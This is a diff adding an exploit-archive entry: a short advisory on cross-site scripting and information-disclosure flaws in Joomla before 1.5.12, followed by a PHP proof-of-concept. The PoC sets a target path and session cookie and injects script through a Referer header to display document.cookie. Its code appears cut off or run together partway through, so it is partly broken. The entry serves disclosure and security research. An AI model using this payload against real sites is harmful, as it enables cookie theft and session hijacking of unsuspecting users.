@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/35544/info
+
+Joomla! is prone to multiple cross-site scripting and information-disclosure vulnerabilities.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and obtain sensitive information.
+
+These issues affect versions prior to 1.5.12.
+
+/* PoC: XSS Joomla 1.5.11 Juan Galiana Lara Internet Security Auditors Jun 2009 */ /* config */ $site='localhost'; $path='/joomla-1.5.11'; $cookname='d85558a8cf943386aaa374896bfd3d99'; $cookvalue='4ab56fdd83bcad86289726aead602699'; class cURL { var $headers; var $user_agent; var $compression; var $cookie_file; var $proxy; /* evil script */ var $xss='alert("PWN PWN PWN: " + document.cookie);'; function cURL($cookies=TRUE,$cookie='cookies.txt',$compression='gzip',$proxy='') { $this->headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'; $this->headers[] = 'Connection: Keep-Alive'; $this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8'; $this->headers[] = 'Referer: ">get('http://' . $site . $path . '/index.php?option=com_content&view=article&layout=form'); /* let's execute some javascript.. }:-)*/ echo $c; ?> 
